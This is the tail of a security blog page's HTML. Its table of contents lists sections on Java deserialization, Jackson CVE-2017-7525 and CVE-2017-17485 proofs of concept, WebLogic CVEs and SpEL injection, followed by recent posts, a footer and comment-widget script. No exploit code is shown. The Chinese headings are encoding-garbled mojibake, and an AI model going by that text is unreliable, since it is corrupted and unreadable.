toc-level-3"><a class="toc-link" href="#%E4%B8%80-1"><span class="toc-number">18.1.1.</span> <span class="toc-text">ä¸€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-1"><span class="toc-number">18.1.2.</span> <span class="toc-text">äºŒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-1"><span class="toc-number">18.1.3.</span> <span class="toc-text">ä¸‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-1"><span class="toc-number">18.1.4.</span> <span class="toc-text">å››</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JsonTypeInfo-%E6%B3%A8%E8%A7%A3"><span class="toc-number">18.2.</span> <span class="toc-text">@JsonTypeInfo æ³¨è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-NONE"><span class="toc-number">18.2.1.</span> <span class="toc-text">JsonTypeInfo.Id.NONE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-CLASS"><span class="toc-number">18.2.2.</span> <span class="toc-text">JsonTypeInfo.Id.CLASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-MINIMAL-CLASS"><span class="toc-number">18.2.3.</span> <span class="toc-text">JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-NAME"><span class="toc-number">18.2.4.</span> <span class="toc-text">JsonTypeInfo.Id.NAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-CUSTOM"><span class="toc-number">18.2.5.</span> <span class="toc-text">JsonTypeInfo.Id.CUSTOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.3.</span> <span class="toc-text">ååºåˆ—åŒ–æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7525"><span class="toc-number">18.4.</span> <span class="toc-text">CVE-2017-7525</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">18.4.1.</span> <span class="toc-text">å½±å“ç‰ˆæœ¬</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-17485"><span class="toc-number">18.5.</span> <span class="toc-text">CVE-2017-17485</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">18.5.1.</span> <span class="toc-text">å½±å“ç‰ˆæœ¬</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-2"><span class="toc-number">18.5.1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spel-xml"><span class="toc-number">18.5.1.2.</span> <span class="toc-text">spel.xml</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">19.</span> <span class="toc-text">yamlååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">19.1.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">20.</span> <span class="toc-text">Hessianååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring%E6%A0%B8%E5%BF%83"><span class="toc-number">21.</span> <span class="toc-text">Springæ ¸å¿ƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IOC"><span class="toc-number">21.1.</span> <span class="toc-text">IOC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">21.1.1.</span> <span class="toc-text">æµ‹è¯•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beans-xml"><span class="toc-number">21.1.2.</span> <span class="toc-text">beans.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DI%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5"><span class="toc-number">21.2.</span> <span class="toc-text">DIä¾èµ–æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-P%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">21.3.</span> <span class="toc-text">C&#x2F;På‘½åç©ºé—´</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebLogic"><span class="toc-number">22.</span> <span class="toc-text">WebLogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">22.1.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D"><span class="toc-number">22.1.1.</span> <span class="toc-text">å½±å“</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">22.2.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-number">22.3.</span> <span class="toc-text">CVE-2017-3506</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-1"><span class="toc-number">22.3.1.</span> <span class="toc-text">å½±å“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">22.3.2.</span> <span class="toc-text">åˆ©ç”¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEL"><span class="toc-number">23.</span> <span class="toc-text">SpEL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Expression-%E5%BD%A2%E5%BC%8F%E7%9A%84-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">23.1.</span> <span class="toc-text">Expression å½¢å¼çš„ SpEL è¡¨è¾¾å¼æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">24.</span> <span class="toc-text">å‚è€ƒ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">25.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pom-xml-1"><span class="toc-number">26.</span> <span class="toc-text">pom.xml</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/" title="JAVAå®‰å…¨å…¥é—¨åˆ†äº«">JAVAå®‰å…¨å…¥é—¨åˆ†äº«</a><time datetime="2025-03-17T11:17:14.000Z" title="Created 2025-03-17 19:17:14">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THMç¬”è®°">THMç¬”è®°</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024é¹ç¨‹æ¯">2024é¹ç¨‹æ¯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/27/vnctf2025javaGuide/" title="vnctf2025javaGuide">vnctf2025javaGuide</a><time datetime="2025-02-27T10:33:16.000Z" title="Created 2025-02-27 18:33:16">2025-02-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25%E8%A5%BF%E6%B9%96/" title="25è¥¿æ¹–">25è¥¿æ¹–</a><time datetime="2025-01-20T05:22:49.000Z" title="Created 2025-01-20 13:22:49">2025-01-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>